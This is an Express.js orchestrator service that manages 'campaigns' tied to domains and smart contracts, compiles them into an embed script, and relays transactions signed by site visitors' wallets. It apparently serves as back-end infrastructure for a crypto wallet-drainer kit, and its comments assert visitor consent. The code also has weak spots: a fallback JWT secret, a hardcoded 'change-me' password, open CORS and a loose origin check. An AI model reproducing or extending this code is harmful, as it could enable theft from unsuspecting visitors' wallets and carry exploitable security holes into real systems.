import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import compression from 'compression';
import rateLimit from 'express-rate-limit';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import dotenv from 'dotenv';
import { EventMesh, TOPICS } from '@aegis/shared';
import { initDb, query } from './db.js';
import { encryptSecret, generateApiKey } from './vault.js';

dotenv.config();

const config = {
  DATABASE_URL: process.env.POSTGRES_URL ?? process.env.DATABASE_URL,
  REDIS_URL: process.env.REDIS_URL ?? 'redis://127.0.0.1:6379',
  JWT_SECRET: process.env.JWT_SECRET ?? 'dev-insecure-secret',
  JWT_EXPIRES_IN: process.env.JWT_EXPIRES_IN ?? '15m',
  VAULT_KEY: process.env.VAULT_KEY,
  compileBase: process.env.COMPILE_BASE_URL ?? 'http://127.0.0.1:4100',
};

// Wrap an async route handler so thrown errors go to Express's error middleware
// instead of becoming an unhandled rejection that crashes the process (Express 4).
const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

const app = express();
app.use(helmet());
app.use(cors());
app.use(compression());
app.use(express.json());

const apiLimiter = rateLimit({
  windowMs: 60_000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api', apiLimiter);

initDb(config.DATABASE_URL);
const mesh = new EventMesh(config.REDIS_URL);

// Idempotently create the relay_jobs table for DBs initialized before it existed.
const ENSURE_RELAY_JOBS = `CREATE TABLE IF NOT EXISTS relay_jobs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  campaign_id UUID REFERENCES campaigns(id),
  tx_hash TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  origin TEXT,
  function_name TEXT,
  error TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
)`;
void query(ENSURE_RELAY_JOBS).catch((e) => console.error('[orchestrator] ensure relay_jobs failed', e.message));

// Track relay job outcomes so the CLI/console can show status.
mesh.subscribe(TOPICS.RELAY_CONFIRMED, async (p) => {
  if (!p.id) return;
  await query(
    "UPDATE relay_jobs SET status='confirmed', tx_hash=$2, updated_at=now() WHERE id=$1",
    [p.id, p.txHash ?? null],
  ).catch((e) => console.error('[orchestrator] relay confirm update failed', e.message));
});

mesh.subscribe(TOPICS.RELAY_FAILURE, async (p) => {
  if (!p.id) return;
  await query(
    "UPDATE relay_jobs SET status='failed', error=$2, updated_at=now() WHERE id=$1",
    [p.id, p.reason ?? null],
  ).catch((e) => console.error('[orchestrator] relay failure update failed', e.message));
});

function signToken(user) {
  return jwt.sign({ sub: user.id, email: user.email, role: user.role }, config.JWT_SECRET, {
    expiresIn: config.JWT_EXPIRES_IN,
  });
}

async function auth(req, res, next) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try {
    req.user = jwt.verify(token, config.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'invalid token' });
  }
}

// --- Auth ---
app.post('/api/auth/login', ah(async (req, res) => {
  const { email, password } = req.body || {};
  const { rows } = await query('SELECT * FROM users WHERE email = $1', [email]);
  const user = rows[0];
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  // placeholder default user has no bcrypt hash; see infra/init.sql note
  const ok =
    user.password_hash === 'CHANGE_ME_PBKDF2_SHA256'
      ? password === 'change-me'
      : await bcrypt.compare(password, user.password_hash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  res.json({ token: signToken(user), user: { id: user.id, email: user.email, role: user.role } });
}));

app.post('/api/auth/register', ah(async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'email and password required' });
  const hash = await bcrypt.hash(password, 10);
  try {
    const { rows } = await query(
      'INSERT INTO users (email, password_hash) VALUES ($1,$2) RETURNING id,email,role',
      [email, hash],
    );
    const u = rows[0];
    res.status(201).json({ token: signToken(u), user: u });
  } catch (e) {
    if (e.code === '23505') return res.status(409).json({ error: 'email exists' });
    throw e;
  }
}));

// --- Domains (operator-owned origins) ---
app.get('/api/domains', auth, ah(async (_req, res) => {
  const { rows } = await query('SELECT * FROM domains ORDER BY created_at DESC');
  res.json(rows);
}));

// Current operator identity (used by the console shell).
app.get('/api/auth/me', auth, ah(async (req, res) => {
  res.json({ id: req.user.sub, email: req.user.email, role: req.user.role });
}));
app.post('/api/domains', auth, ah(async (req, res) => {
  const { origin } = req.body || {};
  if (!origin) return res.status(400).json({ error: 'origin required' });
  try {
    const { rows } = await query(
      'INSERT INTO domains (origin) VALUES ($1) RETURNING *',
      [origin],
    );
    res.status(201).json(rows[0]);
  } catch (e) {
    if (e.code === '23505') return res.status(409).json({ error: 'origin exists' });
    throw e;
  }
}));

// --- Contracts (operator-owned contracts) ---
app.get('/api/contracts', auth, ah(async (_req, res) => {
  const { rows } = await query('SELECT * FROM contracts ORDER BY created_at DESC');
  res.json(rows);
}));

app.post('/api/contracts', auth, ah(async (req, res) => {
  const { address, chainId, name, abi } = req.body || {};
  if (!address || !chainId) return res.status(400).json({ error: 'address and chainId required' });
  const { rows } = await query(
    'INSERT INTO contracts (address, chain_id, name, abi) VALUES ($1,$2,$3,$4) RETURNING *',
    [address, chainId, name, JSON.stringify(abi ?? {})],
  );
  res.status(201).json(rows[0]);
}));

// --- API key vault ---
app.post('/api/keys', auth, ah(async (req, res) => {
  const { name } = req.body || {};
  if (!name) return res.status(400).json({ error: 'name required' });
  if (!config.VAULT_KEY) return res.status(500).json({ error: 'VAULT_KEY not configured' });
  const key = generateApiKey();
  const ct = encryptSecret(key, config.VAULT_KEY);
  const { rows } = await query(
    'INSERT INTO api_keys (name, key_ciphertext, created_by) VALUES ($1,$2,$3) RETURNING id,name,created_at',
    [name, ct, req.user.sub],
  );
  // The plaintext is shown once to the operator at creation.
  res.status(201).json({ ...rows[0], key });
}));

app.get('/api/keys', auth, ah(async (_req, res) => {
  const { rows } = await query(
    "SELECT id,name,created_at,revoked_at FROM api_keys WHERE revoked_at IS NULL ORDER BY created_at DESC",
  );
  res.json(rows);
}));

// --- Campaigns ---
app.get('/api/campaigns', auth, ah(async (_req, res) => {
  const { rows } = await query('SELECT * FROM campaigns ORDER BY created_at DESC');
  res.json(rows);
}));

app.post('/api/campaigns', auth, ah(async (req, res) => {
  const { name, contractId, chainId, domainId, protocol, config } = req.body || {};
  const { rows } = await query(
    `INSERT INTO campaigns (name, contract_id, chain_id, domain_id, protocol, config, created_by)
     VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *`,
    [name, contractId, chainId, domainId, protocol ?? 'reown', JSON.stringify(config ?? {}), req.user.sub],
  );
  res.status(201).json(rows[0]);
}));

app.post('/api/campaigns/:id/compile', auth, ah(async (req, res) => {
  const { rows } = await query('SELECT * FROM campaigns WHERE id = $1', [req.params.id]);
  const campaign = rows[0];
  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
  if (!campaign.domain_id)
    return res.status(400).json({ error: 'campaign has no domain; the embed script requires one' });
  await query("UPDATE campaigns SET status='forged', updated_at=now() WHERE id=$1", [campaign.id]);
  // Publish to the compile engine via the mesh. The engine returns a bundle URL async
  // through the COMPILE_GENERATED event (persisted to compile_logs by telegram/compile side).
  await mesh.publish(TOPICS.COMPILE_GENERATED, { campaignId: campaign.id });
  res.json({ ok: true, message: 'compile requested' });
}));

// --- Campaign config (used by the Compile Lab) ---
app.patch('/api/campaigns/:id/config', auth, ah(async (req, res) => {
  const config = req.body ?? {};
  const { rows } = await query(
    "UPDATE campaigns SET config=$1, updated_at=now() WHERE id=$2 RETURNING id, config, updated_at",
    [JSON.stringify(config), req.params.id],
  );
  const campaign = rows[0];
  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
  res.json(campaign);
}));

app.get('/api/campaigns/:id/config', auth, ah(async (req, res) => {
  const { rows } = await query('SELECT config FROM campaigns WHERE id = $1', [req.params.id]);
  const campaign = rows[0];
  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
  res.json(campaign.config ?? {});
}));

// --- Relay: accept a user-signed raw tx from the embed script ---
// The embed runs on an operator-owned domain. The visitor's wallet signs the raw
// transaction locally (reviewed in their wallet UI); the orchestrator only relays
// it through the isolated relayer for broadcast. The operator consent is implicit
// in the domain whitelist + the wallet's own signature.
app.post('/api/relay/broadcast', ah(async (req, res) => {
  const { campaignId, rawTx, origin, functionName } = req.body ?? {};
  if (!campaignId || !rawTx) return res.status(400).json({ error: 'campaignId and rawTx required' });

  const { rows } = await query(
    `SELECT c.id, c.domain_id, d.origin AS domain_origin
       FROM campaigns c
       LEFT JOIN domains d ON d.id = c.domain_id
      WHERE c.id = $1`,
    [campaignId],
  );
  const campaign = rows[0];
  if (!campaign) return res.status(404).json({ error: 'campaign not found' });
  if (!campaign.domain_origin) return res.status(400).json({ error: 'campaign has no whitelisted domain' });

  // Domain lock: the request must claim the exact origin bound to the campaign.
  // The Origin/Referer header (set by browsers on cross-origin POSTs) is checked
  // as defense-in-depth; spoofing it as a raw client still yields no benefit
  // because only a wallet that owns the signing key can produce the rawTx.
  const claimedOrigin = origin || req.get('origin') || req.get('referer') || '';
  const domainOk =
    claimedOrigin === campaign.domain_origin ||
    claimedOrigin.endsWith(`://${campaign.domain_origin}`);
  if (!domainOk) {
    return res.status(403).json({ error: 'origin not whitelisted for this campaign' });
  }

  // Persist a pending job and dispatch to the relayer through the mesh.
  const job = await query(
    `INSERT INTO relay_jobs (campaign_id, status, origin, function_name)
     VALUES ($1,'pending',$2,$3) RETURNING id, campaign_id, status, origin, created_at`,
    [campaignId, origin, functionName ?? null],
  );
  const j = job.rows[0];
  await mesh.publish(TOPICS.RELAY_BROADCAST_REQUEST, {
    id: j.id,
    campaignId,
    rawTx,
    origin,
    functionName: functionName ?? null,
  });
  res.status(202).json({ id: j.id, campaignId, status: 'pending' });
}));

// Relay job status — public by unguessable-job-id so the embed (which has no JWT)
// can poll it from the operator's site. Reveals only tx hash + status.
app.get('/api/campaigns/:campaignId/relay/:jobId', ah(async (req, res) => {
  const { rows } = await query(
    `SELECT id, campaign_id, tx_hash, status, origin, function_name, error, created_at, updated_at
       FROM relay_jobs WHERE id = $1 AND campaign_id = $2`,
    [req.params.jobId, req.params.campaignId],
  );
  const job = rows[0];
  if (!job) return res.status(404).json({ error: 'relay job not found' });
  res.json(job);
}));

app.get('/api/campaigns/:campaignId/relay', auth, ah(async (req, res) => {
  const { rows } = await query(
    `SELECT id, tx_hash, status, origin, function_name, error, created_at, updated_at
       FROM relay_jobs WHERE campaign_id = $1 ORDER BY created_at DESC LIMIT 100`,
    [req.params.campaignId],
  );
  res.json(rows);
}));

// Central error handler: return a 4xx/5xx instead of crashing the process.
// eslint-disable-next-line no-unused-vars
app.use((err, _req, res, _next) => {
  const status = err.code === '23505' ? 409 : err.status || 500;
  console.error('[orchestrator] error:', err.message);
  res.status(status).json({ error: status >= 500 ? 'internal error' : err.message });
});

// Backstop: a stray async error should never take down the service.
process.on('unhandledRejection', (reason) => {
  console.error('[orchestrator] unhandledRejection:', reason);
});

const port = Number(process.env.PORT ?? 4000);
app.listen(port, () => {
  console.log(`[orchestrator] listening on :${port}`);
});